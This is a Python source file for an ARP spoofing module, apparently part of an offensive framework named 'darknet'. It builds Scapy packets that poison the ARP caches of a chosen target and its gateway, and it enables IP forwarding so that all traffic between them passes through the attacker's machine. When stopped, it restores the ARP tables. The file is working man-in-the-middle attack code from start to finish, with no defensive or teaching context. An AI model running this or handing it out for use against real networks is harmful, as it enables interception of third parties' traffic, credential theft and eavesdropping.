"""
ARP spoofing attack module (Bettercap-style)
Man-in-the-middle attack via ARP poisoning
"""

from scapy.all import *
from darknet.core.base import AttackModule
from darknet.utils.constants import *
import time
import subprocess
import threading


class ARPSpoof(AttackModule):
    """
    ARP spoofing attack for MITM
    Poisons ARP cache to intercept traffic between target and gateway
    """

    def __init__(self):
        super().__init__(
            name="ARP Spoof",
            description="ARP poisoning for man-in-the-middle attacks",
            attack_type="arp_spoof"
        )
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.interval = 2
        self.bidirectional = True
        self.restore_on_exit = True
        self.ip_forward_enabled = False

    def setup(self, **kwargs) -> bool:
        """
        Setup ARP spoofing
        Args:
            interface: Network interface
            target_ip: Target IP address
            gateway_ip: Gateway IP address
            interval: Packet interval in seconds
            bidirectional: Spoof both directions
            restore_on_exit: Restore ARP tables on exit
        """
        try:
            self.interface = kwargs.get('interface')
            self.target_ip = kwargs.get('target_ip')
            self.gateway_ip = kwargs.get('gateway_ip')
            self.interval = kwargs.get('interval', 2)
            self.bidirectional = kwargs.get('bidirectional', True)
            self.restore_on_exit = kwargs.get('restore_on_exit', True)

            if not all([self.interface, self.target_ip, self.gateway_ip]):
                self.logger.error("Interface, target IP, and gateway IP required")
                return False

            # Get MAC addresses
            self.target_mac = self._get_mac(self.target_ip)
            self.gateway_mac = self._get_mac(self.gateway_ip)

            if not self.target_mac or not self.gateway_mac:
                self.logger.error("Failed to resolve MAC addresses")
                return False

            self.logger.info(f"ARP spoof configured:")
            self.logger.info(f"  Target: {self.target_ip} ({self.target_mac})")
            self.logger.info(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")

            # Enable IP forwarding
            self._enable_ip_forward()

            return True

        except Exception as e:
            self.logger.error(f"Setup failed: {e}")
            return False

    def _get_mac(self, ip: str) -> str:
        """Get MAC address for IP"""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2,
                verbose=False,
                iface=self.interface
            )
            if ans:
                return ans[0][1].hwsrc
        except Exception as e:
            self.logger.error(f"Failed to get MAC for {ip}: {e}")
        return None

    def _enable_ip_forward(self):
        """Enable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            self.ip_forward_enabled = True
            self.logger.info("IP forwarding enabled")
        except Exception as e:
            self.logger.error(f"Failed to enable IP forwarding: {e}")

    def _disable_ip_forward(self):
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0\n')
            self.logger.info("IP forwarding disabled")
        except Exception:
            pass

    def _send_arp_spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        """Send ARP spoofing packet"""
        try:
            # Create ARP packet claiming to be spoof_ip
            pkt = ARP(
                op=2,  # is-at (response)
                psrc=spoof_ip,
                pdst=target_ip,
                hwdst=target_mac
            )
            send(pkt, verbose=False, iface=self.interface)
            self.packets_sent += 1
        except Exception as e:
            self.logger.error(f"Failed to send ARP packet: {e}")

    def _restore_arp(self, target_ip: str, target_mac: str, real_ip: str, real_mac: str):
        """Restore ARP table"""
        try:
            pkt = ARP(
                op=2,
                psrc=real_ip,
                pdst=target_ip,
                hwsrc=real_mac,
                hwdst=target_mac
            )
            send(pkt, count=5, verbose=False, iface=self.interface)
            self.logger.info(f"Restored ARP for {target_ip}")
        except Exception as e:
            self.logger.error(f"Failed to restore ARP: {e}")

    def run(self) -> dict:
        """Execute ARP spoofing"""
        try:
            self.logger.attack(f"Starting ARP spoofing: {self.target_ip} <-> {self.gateway_ip}")
            self.logger.warning("All traffic between target and gateway will be intercepted")

            while not self._stop_event.is_set():
                # Spoof target (tell target we are gateway)
                self._send_arp_spoof(self.target_ip, self.target_mac, self.gateway_ip)

                # Spoof gateway (tell gateway we are target) - bidirectional
                if self.bidirectional:
                    self._send_arp_spoof(self.gateway_ip, self.gateway_mac, self.target_ip)

                if self.packets_sent % 100 == 0:
                    self.logger.info(f"Sent {self.packets_sent} ARP packets")

                time.sleep(self.interval)

            self.logger.info("ARP spoofing stopped")

            return {
                'success': True,
                'packets_sent': self.packets_sent,
                'target_ip': self.target_ip,
                'gateway_ip': self.gateway_ip
            }

        except Exception as e:
            self.logger.error(f"Attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def stop(self):
        """Stop the attack"""
        self._stop_event.set()

        # Restore ARP tables
        if self.restore_on_exit:
            self.logger.info("Restoring ARP tables...")
            self._restore_arp(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
            if self.bidirectional:
                self._restore_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)

    def cleanup(self):
        """Cleanup resources"""
        if self.ip_forward_enabled:
            self._disable_ip_forward()
